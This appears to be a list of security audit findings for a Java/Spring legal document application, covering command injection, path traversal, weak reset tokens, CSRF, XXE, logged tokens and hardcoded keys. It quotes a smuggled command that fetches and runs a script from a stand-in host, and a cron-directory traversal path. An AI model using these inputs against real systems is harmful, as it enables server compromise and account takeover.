extra.message: In normalizeRendition(), the JSON request fields ConversionRequest.fileName and ConversionRequest.targetFormat (sourceName/format) are concatenated directly into a shell command string passed to `new ProcessBuilder("/bin/sh", "-c", "soffice --headless --convert-to " + format + " --outdir /tmp " + sourceName)`. Any authenticated user with 'documents:update' rights can submit a fileName or targetFormat containing shell metacharacters (e.g. `; curl evil.sh | sh #`) to execute arbitrary commands on the server with the application's privileges.

extra.message: storeRendition(fileName, content) builds the write path as `root.resolve("renditions").resolve(fileName)` with no normalization or containment check against the storage root (unlike the safe resolve() method elsewhere in this same class, which does `.normalize()` + `startsWith(root)`). It is reached from DocumentsController.fileRendition() (web/DocumentsController.java:279-299), which passes the attacker-controlled JSON field Rendition.fileName straight through. A value such as `../../../../etc/cron.d/evil` or an absolute path lets an authenticated user with document-update rights write/overwrite arbitrary files anywhere the process can reach, with `StandardOpenOption.TRUNCATE_EXISTING`.

extra.message: newRawToken() generates password-reset tokens as `"rc" + RESET_SEQ.incrementAndGet() + "-" + RESET_RANDOM.nextInt(900000)`, using a predictable monotonically-increasing counter plus `java.util.Random` (not a CSPRNG) bounded to only 900,000 values. Unlike every other secret in this codebase (API keys, webhook secrets use SecureRandom), reset tokens are guessable/brute-forceable: an attacker who triggers a reset knows the approximate counter value and only has to search a 900,000-value space for the random suffix, enabling account takeover via the password-reset flow (confirm() at line 109 accepts any token matching the stored SHA-256 digest).

extra.message: The Spring Security filter chain exempts `/documents/*/visibility` from CSRF protection (`csrf.ignoringRequestMatchers("/api/v1/**", "/documents/*/visibility")`). This endpoint (DocumentsController.changeVisibility, POST /documents/{id}/visibility) is a session-cookie-authenticated, state-changing action that can switch a document's visibility to CLIENT_SHARED. With CSRF disabled, a forged cross-site POST from a page the victim (an attorney/admin) visits while logged in can change document sharing/visibility without the victim's consent or knowledge.

importMatterDocket() parses an uploaded XML file with `XMLInputFactory.newInstance()` / `createXMLStreamReader(in)` without disabling DTDs or external entities (no `XMLInputFactory.SUPPORT_DTD=false`, no `IS_SUPPORTING_EXTERNAL_ENTITIES=false`). The default StAX configuration supports external entity resolution, so a crafted docket XML file containing a DOCTYPE with an external entity can cause local file disclosure or server-side request forgery when the firm-admin uploads it through this import flow.

extra.message: sendPasswordReset() logs the raw, single-use password-reset token at INFO level (`log.info("Reset link issued for {}: {}{}", user.email(), resetUrl, token)`). Application logs are typically retained, aggregated and accessible to a broader audience (ops/support/log shippers) than the password-reset flow intends; anyone with log read access can hijack the account by replaying the logged reset link within its validity window.

extra.message: The AES key used to encrypt/decrypt the session continuity marker falls back to a hardcoded literal (`MatterDeskMarkrK`) via `@Value("${app.session.marker-key:MatterDeskMarkrK}")`, and application.yml wires the same literal as the default for the MARKER_KEY environment variable. Any deployment that does not explicitly override MARKER_KEY uses a key published in the source tree, letting anyone who has read the source forge or decrypt marker tokens.

The shared AES key used to decrypt partner report packets falls back to a hardcoded literal (`MatterDeskPacktK`) via `@Value("${app.reports.packet-key:MatterDeskPacktK}")`, matched by the same default in application.yml's REPORT_PACKET_KEY. Any deployment that forgets to override this environment variable uses a key visible in source control, letting anyone with source access decrypt or forge exchanged report packets.

The court e-filing gateway subscriber key falls back to a hardcoded, live-looking literal (`efk_live_dev_5f2c47bd8a`) via `@Value("${app.filing.subscriber-key:efk_live_dev_5f2c47bd8a}")`, mirrored as the default for EFILING_SUBSCRIBER_KEY in application.yml. If this environment variable is not set in a deployment, the firm's vendor credential checked into source is used to authenticate fee-quote requests, and is also sent as a URL query parameter (further exposing it in logs/proxies).
